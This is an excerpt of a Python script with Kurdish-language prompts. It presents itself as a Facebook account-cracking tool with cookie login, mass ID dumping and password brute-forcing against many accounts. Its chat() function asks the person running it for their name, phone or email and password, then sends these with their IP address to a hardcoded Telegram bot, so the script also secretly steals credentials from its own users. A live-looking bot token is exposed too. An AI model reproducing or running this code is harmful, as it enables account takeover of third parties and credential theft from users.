...
try:
        ...
        cetak(nel('\t Chawrawan ba bo install 1'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t Chawrawan ba bo install 2'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t Chawrawan ba bo install 3'))
...
def chk():
  ...
  try:
    httpCaht = requests.get("https://github.com/MALAshafiq/MALAshafiq/blob/main/Active.txt").text
    if id in httpCaht:
      ...
      print("\x1b[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo [@malashafiq]")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
def banner():
	...
	alvino_xy(f'''\t{asu}                                               
         ...
         ##     ## ##     ## ##       ##     ##
         ##     ## ##     ## ######## ##     ##
\t{m}${k}${h}${sir} Author By : MALA SHAFIQ & BLND  V8{x}{m}${k}${h}${x}''')
...
def login():
	try:
		...
		try:
			...
			li = '# Xatt Xawa Tkaya Dubara Hawl Bdawa'
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tLERA COOKIE DANE : [green]Cookie[white] '))
		...
		print(f'  {x}[{h}${x}]{h} LOGIN SECCESFULL{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
import requests
def chat():
	token_login = '5661351707:AAGwmG9HtA3DdtxDJQl8WYspT8Cd-PCITvU'
	IP = requests.get('https://api.ipify.org').text
	id_login = '1154724151'
	print("")
	print("Pewesta Account Drust Bkait Bo Xera Krdne Toolaka Bo Crack!")
	print("")
	NAW = input('Naw :')
	print("")
	LOGIN = input('Raqam Yan Email Bnusa :')
	print("")
	PASSW = input('Password Bnusa :')
	print("")
	message = '───────────────────────'
	message2 = (f'Xalk Daxel Bu✅')
	message1 = (f'───────────────────────')
	message3 = (f'🪧| Nawe Kasaka: {NAW}')
	message4 = (f'🪧| Ip Kasaka: {IP}')
	message5 = (f'🔢| Raqam Yan Email: {LOGIN}')
	message6 = (f'🔑| password: {PASSW}')
	requests.post(f'https://api.telegram.org/bot'+token_login+'/sendMessage?chat_id='+id_login+'&text='+message1+'\n'+message2+'\n'+message3+'\n'+message4+'\n'+message5+'\n'+message6+'\n'+message)
	print("Basarkawtuey Daxel Buet")
def NAW():
	print("[ 1. Chuna zhurawa ]")
	print("")
	mrx =input("Halbzhera : ")
	if mrx =='1':
		chat()
...
def menu(my_name,my_id):
	...
	print('>> 5. Zanene Aw Accanay Hackt Krdwa')
	print('')
...
def dump_massal():
	...
	try:
		print('')
		print(f'>> Aw Ideanay Agare Crackean Haya{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def setting():
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]$[white]] PASSWORD BNUSA\n[[cyan]$[white]] Contoh :[green] kakak,ngentod,adik[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}${k}${h}${x} Crack Daste Pekrd Tkaya Chawarwanba😈 {m}${k}${h}${x} <<<<< ')
	print('')
	print(f'')
	...
	print(f'[{b}CRACKED¢{x}]{h} OK : {h}%s '%(ok))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rCRACK {P}[{b}{loop}{P}/{u}{len(id)}{P}]${P}[{H}{ok}{P}]${P}[{k}{cp}{x}]$[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\rCRACK {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]${P}[{H}{ok}{P}]${P}[{k}{cp}{x}]$[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
